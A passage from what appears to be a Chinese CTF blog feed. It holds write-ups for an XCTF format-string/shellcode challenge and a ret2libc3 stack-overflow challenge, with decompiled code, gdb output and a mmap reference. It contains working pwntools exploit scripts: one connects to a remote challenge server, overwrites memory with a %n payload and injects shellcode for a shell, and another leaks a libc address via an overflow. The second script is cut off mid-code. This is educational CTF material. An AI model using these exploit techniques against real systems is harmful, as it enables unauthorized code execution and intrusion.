class="token punctuation">)</span><span class="token operator">&amp;</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>s<span class="token punctuation">)</span> <span class="token operator">&lt;=</span> <span class="token number">12</span> <span class="token punctuation">)</span>  <span class="token punctuation">{</span>    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Creating a new player."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">sub_400A7D</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                               <span class="token comment" spellcheck="true">// 只能输入east</span>    <span class="token function">sub_400BB9</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                               <span class="token comment" spellcheck="true">// 格式化字符串漏洞</span>    <span class="token function">sub_400CA6</span><span class="token punctuation">(</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span>a1<span class="token punctuation">)</span><span class="token punctuation">;</span>                   <span class="token comment" spellcheck="true">// 映射一个大小为4096字节的空间 该空间由读写执行权 传入了开辟空间的地址a1</span>  <span class="token punctuation">}</span>  <span class="token keyword">else</span>  <span class="token punctuation">{</span>    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Hei! What's up!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token keyword">return</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span> <span class="token operator">^</span> v3<span class="token punctuation">;</span><span class="token punctuation">}</span>sub_400A7D函数：执行后我们能且只能输入east，没多大用sub_400BB9函数：<span class="token keyword">unsigned</span> __int64 <span class="token function">sub_400BB9</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token keyword">int</span> v1<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+4h] [rbp-7Ch]</span>  __int64 v2<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+8h] [rbp-78h]</span>  <span class="token keyword">char</span> format<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+10h] [rbp-70h]</span>  <span class="token keyword">unsigned</span> __int64 v4<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+78h] [rbp-8h]</span>  v4 <span class="token operator">=</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  v2 <span class="token operator">=</span> <span class="token number">0LL</span><span class="token punctuation">;</span>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"You travel a short distance east.That's odd, anyone disappear suddenly"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">", what happend?! You just travel , and find another hole"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"You recall, a big black hole will suckk you into it! Know what should you do?"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"go into there(1), or leave(0)?:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">_isoc99_scanf</span><span class="token punctuation">(</span><span class="token punctuation">(</span>__int64<span class="token punctuation">)</span><span class="token string">"%d"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>__int64<span class="token punctuation">)</span><span class="token operator">&amp;</span>v1<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> v1 <span class="token operator">==</span> <span class="token number">1</span> <span class="token punctuation">)</span>  <span class="token punctuation">{</span>    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"A voice heard in your mind"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"'Give me an address'"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">_isoc99_scanf</span><span class="token punctuation">(</span><span class="token punctuation">(</span>__int64<span class="token punctuation">)</span><span class="token string">"%ld"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>__int64<span class="token punctuation">)</span><span class="token operator">&amp;</span>v2<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"And, you wish is:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">_isoc99_scanf</span><span class="token punctuation">(</span><span class="token punctuation">(</span>__int64<span class="token punctuation">)</span><span class="token string">"%s"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>__int64<span class="token punctuation">)</span><span class="token operator">&amp;</span>format<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Your wish is"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>format<span class="token punctuation">,</span> <span class="token operator">&amp;</span>format<span class="token punctuation">)</span><span class="token punctuation">;</span>                   <span class="token comment" spellcheck="true">// 格式化字符串漏洞</span>                                                <span class="token comment" spellcheck="true">// </span>    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"I hear it, I hear it...."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token keyword">return</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span> <span class="token operator">^</span> v4<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token function">sub_400CA6</span><span class="token punctuation">(</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span>a1<span class="token punctuation">)</span>函数：<span class="token keyword">unsigned</span> __int64 __fastcall <span class="token function">sub_400CA6</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span>a1<span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token keyword">void</span> <span class="token operator">*</span>v1<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// rsi</span>  <span class="token keyword">unsigned</span> __int64 v3<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+18h] [rbp-8h]</span>  v3 <span class="token operator">=</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">40u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Ahu!!!!!!!!!!!!!!!!A Dragon has appeared!!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Dragon say: HaHa! you were supposed to have a normal"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"RPG game, but I have changed it! you have no weapon and "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"skill! you could not defeat me !"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"That's sound terrible! you meet final boss!but you level is ONE!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">*</span>a1 <span class="token operator">==</span> a1<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token punctuation">)</span>                           <span class="token comment" spellcheck="true">// 第一个元素等于第二个元素，这两个元素地址是相邻的</span>  <span class="token punctuation">{</span>    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Wizard: I will help you! USE YOU SPELL"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    v1 <span class="token operator">=</span> <span class="token function">mmap</span><span class="token punctuation">(</span><span class="token number">0LL</span><span class="token punctuation">,</span> <span class="token number">4096uLL</span><span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">,</span> <span class="token number">33</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">// 映射一个大小为4096字节的空间 该空间有读写执行权</span>    <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> v1<span class="token punctuation">,</span> <span class="token number">256uLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token punctuation">(</span>__fastcall <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>_QWORD<span class="token punctuation">,</span> <span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">)</span>v1<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token number">0LL</span><span class="token punctuation">,</span> v1<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">//这里比较难理解</span>  <span class="token punctuation">}</span>  <span class="token keyword">return</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span> <span class="token operator">^</span> v3<span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><h2 id="3：解决疑难语句"><a href="#3：解决疑难语句" class="headerlink" title="3：解决疑难语句"></a>3：解决疑难语句</h2><p><strong>对于((void (__fastcall *)(_QWORD, void *))v1)(0LL, v1);这条语句我查了半天也没怎么理解，也就是说这个伪代码看不懂。在这种时候千万别忘了我们还可以看反汇编内容！！这一块区域的反汇编：</strong></p><pre class=" language-bash"><code class="language-bash">mov     edi, offset aWizardIWillHel <span class="token punctuation">;</span> <span class="token string">"Wizard: I will help you! USE YOU SPELL"</span>   call    putsmov     r9d, 0          <span class="token punctuation">;</span> offsetmov     r8d, 0FFFFFFFFh <span class="token punctuation">;</span> fdmov     ecx, 33         <span class="token punctuation">;</span> flagsmov     edx, 7          <span class="token punctuation">;</span> protmov     esi, 4096       <span class="token punctuation">;</span> lenmov     edi, 0          <span class="token punctuation">;</span> addrcall    mmapmov     <span class="token punctuation">[</span>rbp+buf<span class="token punctuation">]</span>, raxmov     rax, <span class="token punctuation">[</span>rbp+buf<span class="token punctuation">]</span>mov     edx, 256        <span class="token punctuation">;</span> nbytesmov     rsi, rax        <span class="token punctuation">;</span> bufmov     edi, 0          <span class="token punctuation">;</span> fdcall    <span class="token function">read</span>mov     rax, <span class="token punctuation">[</span>rbp+buf<span class="token punctuation">]</span>mov     edi, 0call    rax</code></pre><p><strong>1-2：显然是对应：puts(“Wizard: I will help you! USE YOU SPELL”);这条语句，执行了这一条就能说明程序进入了if语句</strong><br><strong>3-9：是执行了mmap函数，先是将该函数的参数从右到左传入寄存器和一些特别的地方，最后进行调用mmap函数</strong><br><strong>10-15：主要是执行read函数，但我们可以发现这一段除了将传read函数的参数，还进行了其他操作。即第10第11条，将rax的值赋给[rbp+buf]代表的地址上面，又将[rbp+buf]代表的地址赋给rax。在传buf参数时，是将rax放入rsi，所以这个read函数将会入读数据到rax存放的地址上。结合IDA伪代码，这个地址就是可读可写可执行内存区，即[rbp+buf]所代表的地址。</strong><br><strong>16-18：将[rbp+buf]地址放入rax，17行应该不重要，18行就像调用函数一样直接调用rax。那么我们可以肯定((void (__fastcall *)(_QWORD, void *))v1)(0LL, v1)可以执行程序读入的代码</strong></p><h3 id="探究"><a href="#探究" class="headerlink" title="探究"></a>探究</h3><p>1.main函数主要功能：开辟一个8字节的内存空间，该空间第一个元素大小赋值为68第二个元素大小赋值为85 ，输出两者的地址，然后进入sub_400D72(v4)函数<br>2.sub_400D72(v4)函数主要功能：输入一串字符作为角色名字，然后依次执行sub_400A7D()   sub_400BB9()  sub_400CA6((_DWORD *)a1)函数<br>3：sub_400A7D()函数主要功能：让用户输入test字符串，才能继续执行<br>4：sub_400BB9() 函数主要功能：输入1进入if语句，在该语句中先输入整数，再输入字符串，该字符串和后面的printf构成格式化字符串漏洞<br>5：sub_400CA6((_DWORD *)a1)函数主要功能：输出一堆废话 但是如果main函数中所开辟的空间中的第一个元素等于第二个元素，将映射一个有读写执行权的空间。然后在读取输入到空间中，最后那一串语句盲猜是要执行那段空间里面的数据</p><h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p><strong>从main函数中得到两元素地址，在要执行sub_400BB9()函数时利用其包括的格式化字符串漏洞，改两个元素的值使其相等。这样在执行sub_400CA6((_DWORD *)a1)函数时就可以输入shellcode到一个映射空间，由下面的语句执行空间中的shellcode</strong></p><h2 id="4：exp"><a href="#4：exp" class="headerlink" title="4：exp"></a>4：exp</h2><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span><span class="token operator">*</span>context<span class="token punctuation">(</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span>os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">)</span>context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span><span class="token comment" spellcheck="true">#sh = process('./string')</span>sh <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">"220.249.52.133"</span><span class="token punctuation">,</span><span class="token number">32219</span><span class="token punctuation">)</span>sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'[0] is '</span><span class="token punctuation">)</span>addr1 <span class="token operator">=</span> int<span class="token punctuation">(</span>sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span>   <span class="token operator">//</span>获取地址sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'[1] is '</span><span class="token punctuation">)</span>addr2 <span class="token operator">=</span> int<span class="token punctuation">(</span>sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span>    <span class="token operator">//</span>获取地址<span class="token keyword">print</span> addr1<span class="token keyword">print</span> addr2<span class="token keyword">print</span> type<span class="token punctuation">(</span>addr1<span class="token punctuation">)</span>sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>payload1 <span class="token operator">=</span> <span class="token string">'HUNTER'</span>sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload1<span class="token punctuation">)</span>sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>payload2 <span class="token operator">=</span> <span class="token string">'east'</span>sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload2<span class="token punctuation">)</span>sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'1'</span><span class="token punctuation">)</span>sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'123'</span><span class="token punctuation">)</span>sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#formal bug</span>payload3 <span class="token operator">=</span> <span class="token string">"AAA%082d"</span> <span class="token operator">+</span> <span class="token string">"%10$nAAA"</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>addr1<span class="token punctuation">)</span>  <span class="token comment" spellcheck="true">#构造格式化字符串payload时要注意参数位置，以及对应程序操作位数</span><span class="token comment" spellcheck="true">#gdb.attach(sh)</span>sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload3<span class="token punctuation">)</span>sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#input shell</span><span class="token triple-quoted-string string">'''payload4 = ""payload4 += "\x01\x30\x8f\xe2"payload4 += "\x13\xff\x2f\xe1"payload4 += "\x78\x46\x0e\x30"payload4 += "\x01\x90\x49\x1a"payload4 += "\x92\x1a\x08\x27"payload4 += "\xc2\x51\x03\x37"payload4 += "\x01\xdf\x2f\x62"payload4 += "\x69\x6e\x2f\x2f"payload4 += "\x73\x68"'''</span>payload4 <span class="token operator">=</span> asm<span class="token punctuation">(</span>shellcraft<span class="token punctuation">.</span>sh<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload4<span class="token punctuation">)</span>sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><h2 id="5：知识点"><a href="#5：知识点" class="headerlink" title="5：知识点"></a>5：知识点</h2><p>mmap函数 </p><blockquote><p>mmap函数是unix/linux下的系统调用。<br>当存在客户－服务程序中复制文件时候，其数据流如下，要经历四次数据复制，开销很大。<br><img src="https://s1.ax1x.com/2020/07/04/NzLPjU.png" alt=""><br>如果采用共享内存的方式，那么将大大优化IO操作，数据流变成了如下，数据只复制两次：<br><img src="https://s1.ax1x.com/2020/07/04/NzLCcT.png" alt=""><br>映射文件或设备到内存中，取消映射就是munmap函数。<br>语法如下：</p></blockquote><blockquote><p>void mmap(void addr, size_t length, int prot, int flags, int fd, off_t offset);</p></blockquote><blockquote><p>int munmap(void *addr, size_t length);<br>该函数主要用途有三个：</p></blockquote><blockquote><p>1、将普通文件映射到内存中，通常在需要对文件进行频繁读写时使用，用内存读写取代I/O读写，以获得较高的性能；</p></blockquote><blockquote><p>2、将特殊文件进行匿名内存映射，为关联进程提供共享内存空间；</p></blockquote><blockquote><p>3、为无关联的进程间的Posix共享内存（SystemV的共享内存操作是shmget/shmat）</p></blockquote><blockquote><p>我们来看下函数的入参选择：</p></blockquote><blockquote><p>1、参数addr：</p></blockquote><blockquote><p>指向欲映射的内存起始地址，通常设为 NULL，代表让系统自动选定地址，映射成功后返回该地址。</p></blockquote><blockquote><p>2、参数length：</p></blockquote><blockquote><p>代表将文件中多大的部分映射到内存。</p></blockquote><blockquote><p>3、参数prot：</p></blockquote><blockquote><p>映射区域的保护方式。可以为以下几种方式的组合：</p></blockquote><blockquote><p>PROT_EXEC 映射区域可被执行</p></blockquote><blockquote><p>PROT_READ 映射区域可被读取</p></blockquote><blockquote><p>PROT_WRITE 映射区域可被写入</p></blockquote><blockquote><p>PROT_NONE 映射区域不能存取</p></blockquote><blockquote><p>4、参数flags：</p></blockquote><blockquote><p>影响映射区域的各种特性。在调用mmap()时必须要指定MAP_SHARED 或MAP_PRIVATE。</p></blockquote><blockquote><p>MAP_FIXED 如果参数start所指的地址无法成功建立映射时，则放弃映射，不对地址做修正。通常不鼓励用此。</p></blockquote><blockquote><p>MAP_SHARED对映射区域的写入数据会复制回文件内，而且允许其他映射该文件的进程共享。</p></blockquote><blockquote><p>MAP_PRIVATE 对映射区域的写入操作会产生一个映射文件的复制，即私人的“写入时复制”（copy on write）对此区域作的任何修改都不会写回原来的文件内容。</p></blockquote><blockquote><p>MAP_ANONYMOUS建立匿名映射。此时会忽略参数fd，不涉及文件，而且映射区域无法和其他进程共享。</p></blockquote><blockquote><p>MAP_DENYWRITE只允许对映射区域的写入操作，其他对文件直接写入的操作将会被拒绝。</p></blockquote><blockquote><p>MAP_LOCKED 将映射区域锁定住，这表示该区域不会被置换（swap）。</p></blockquote><blockquote><p>5、参数fd：</p></blockquote><blockquote><p>要映射到内存中的文件描述符。如果使用匿名内存映射时，即flags中设置了MAP_ANONYMOUS，fd设为-1。</p></blockquote><blockquote><p>6、参数offset：</p></blockquote><blockquote><p>文件映射的偏移量，通常设置为0，代表从文件最前方开始对应，offset必须是分页大小的整数倍。如下图内存映射文件的示例。<br><img src="https://s1.ax1x.com/2020/07/04/NzLFuF.png" alt=""></p></blockquote><p>原文：<a href="https://segmentfault.com/a/1190000014616732" target="_blank" rel="noopener">https://segmentfault.com/a/1190000014616732</a></p>]]></content>
      
      
      <categories>
          
          <category> CTF-PWN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> xctf-pwn-easy </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>wiki--ret2libc3</title>
      <link href="/2020/07/04/wiki-ret2libc3/"/>
      <url>/2020/07/04/wiki-ret2libc3/</url>
      
        <content type="html"><![CDATA[<h2 id="1：checksec"><a href="#1：checksec" class="headerlink" title="1：checksec"></a>1：checksec</h2><pre class=" language-bash"><code class="language-bash">hunter@hunter:~/PWN/level3$ checksec ret2libc3<span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token string">'/home/hunter/PWN/level3/ret2libc3'</span>    Arch:     i386-32-little    RELRO:    Partial RELRO    Stack:    No canary found    NX:       NX enabled    PIE:      No PIE <span class="token punctuation">(</span>0x8048000<span class="token punctuation">)</span></code></pre><p>只有NX开启</p><h2 id="2：IDA-检查发现没有system和binsh字符串"><a href="#2：IDA-检查发现没有system和binsh字符串" class="headerlink" title="2：IDA 检查发现没有system和binsh字符串"></a>2：IDA 检查发现没有system和binsh字符串</h2><pre class=" language-c"><code class="language-c"><span class="token keyword">int</span> __cdecl <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>envp<span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token keyword">char</span> s<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+1Ch] [ebp-64h]</span>  <span class="token function">setvbuf</span><span class="token punctuation">(</span><span class="token constant">stdout</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">setvbuf</span><span class="token punctuation">(</span><span class="token constant">stdin</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"No surprise anymore, system disappeard QQ."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Can you find it !?"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">gets</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>显然此处gets存在溢出</p><h2 id="3：gdb调试测其溢出点"><a href="#3：gdb调试测其溢出点" class="headerlink" title="3：gdb调试测其溢出点"></a>3：gdb调试测其溢出点</h2><pre class=" language-bash"><code class="language-bash"><span class="token punctuation">[</span>----------------------------------registers-----------------------------------<span class="token punctuation">]</span>EAX: 0x0 EBX: 0x0 ECX: 0xf7fb25c0 --<span class="token operator">></span> 0xfbad2288 EDX: 0xf7fb389c --<span class="token operator">></span> 0x0 ESI: 0xf7fb2000 --<span class="token operator">></span> 0x1d4d6c EDI: 0x0 EBP: 0x6941414d <span class="token punctuation">(</span><span class="token string">'MAAi'</span><span class="token punctuation">)</span>ESP: 0xffffd04c <span class="token punctuation">(</span><span class="token string">"AA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA"</span><span class="token punctuation">)</span>EIP: 0x8048695 <span class="token punctuation">(</span><span class="token operator">&lt;</span>main+125<span class="token operator">></span>:    ret<span class="token punctuation">)</span>EFLAGS: 0x246 <span class="token punctuation">(</span>carry PARITY adjust ZERO sign <span class="token function">trap</span> INTERRUPT direction overflow<span class="token punctuation">)</span><span class="token punctuation">[</span>-------------------------------------code-------------------------------------<span class="token punctuation">]</span>   0x804868a <span class="token operator">&lt;</span>main+114<span class="token operator">></span>:    call   0x8048440 <span class="token operator">&lt;</span>gets@plt<span class="token operator">></span>   0x804868f <span class="token operator">&lt;</span>main+119<span class="token operator">></span>:    mov    eax,0x0   0x8048694 <span class="token operator">&lt;</span>main+124<span class="token operator">></span>:    leave  <span class="token operator">=</span><span class="token operator">></span> 0x8048695 <span class="token operator">&lt;</span>main+125<span class="token operator">></span>:    ret       0x8048696:    xchg   ax,ax   0x8048698:    xchg   ax,ax   0x804869a:    xchg   ax,ax   0x804869c:    xchg   ax,ax<span class="token punctuation">[</span>------------------------------------stack-------------------------------------<span class="token punctuation">]</span>0000<span class="token operator">|</span> 0xffffd04c <span class="token punctuation">(</span><span class="token string">"AA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA"</span><span class="token punctuation">)</span>0004<span class="token operator">|</span> 0xffffd050 <span class="token punctuation">(</span><span class="token string">"ANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA"</span><span class="token punctuation">)</span>0008<span class="token operator">|</span> 0xffffd054 <span class="token punctuation">(</span><span class="token string">"jAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA"</span><span class="token punctuation">)</span>0012<span class="token operator">|</span> 0xffffd058 <span class="token punctuation">(</span><span class="token string">"AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA"</span><span class="token punctuation">)</span>0016<span class="token operator">|</span> 0xffffd05c <span class="token punctuation">(</span><span class="token string">"AkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA"</span><span class="token punctuation">)</span>0020<span class="token operator">|</span> 0xffffd060 <span class="token punctuation">(</span><span class="token string">"PAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA"</span><span class="token punctuation">)</span>0024<span class="token operator">|</span> 0xffffd064 <span class="token punctuation">(</span><span class="token string">"AAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA"</span><span class="token punctuation">)</span>0028<span class="token operator">|</span> 0xffffd068 <span class="token punctuation">(</span><span class="token string">"AmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA"</span><span class="token punctuation">)</span><span class="token punctuation">[</span>------------------------------------------------------------------------------<span class="token punctuation">]</span>Legend: code, data, rodata, value0x08048695    30    <span class="token keyword">in</span> ret2libcGOT.cgdb-peda$ pattern offset AA8AANAAA8AANA found at offset: 112gdb-peda$ </code></pre><p>溢出点为112</p><h3 id="思路："><a href="#思路：" class="headerlink" title="思路："></a>思路：</h3><p><strong>存在栈溢出，可利用函数为puts  gets。我们构造一个puts函数让其输出puts函数的got表地址上的内容–即真正的地址，利用栈溢出控制程序转跳来实现。得到puts函数的确切地址后找到该函数在libc文件中的offset即求出libc地址，有了libc地址啥都好说。将上面构造的puts函数返回地址设置为main函数就可再次进行程序控制，不过这次控制它打开shell。</strong></p><p>exp：libc的地址也可以用__libc_start_main_got来获得</p><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span><span class="token operator">*</span><span class="token keyword">from</span> LibcSearcher <span class="token keyword">import</span><span class="token operator">*</span>context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"ret2libc3"</span><span class="token punctuation">)</span>puts_plt <span class="token operator">=</span> elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span>puts_got <span class="token operator">=</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span><span class="token comment" spellcheck="true">#__libc_start_main_got = elf.got['__libc_start_main']</span>main_addr <span class="token operator">=</span> elf<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'main'</span><span class="token punctuation">]</span>sh <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./ret2libc3"</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#payload1 = "A"*112 + p32(puts_plt) + p32(main_addr) + p32(__libc_start_main_got)</span>payload1 <span class="token operator">=</span> <span class="token string">"A"</span><span class="token operator">*</span><span class="token number">112</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>puts_plt<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>main_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>puts_got<span class="token punctuation">)</span>sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>sh<span class="token punctuation">)</span>sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload1<span class="token punctuation">)</span>puts_addr <span class="token operator">=</span> u32<span class="token punctuation">(</span>sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token 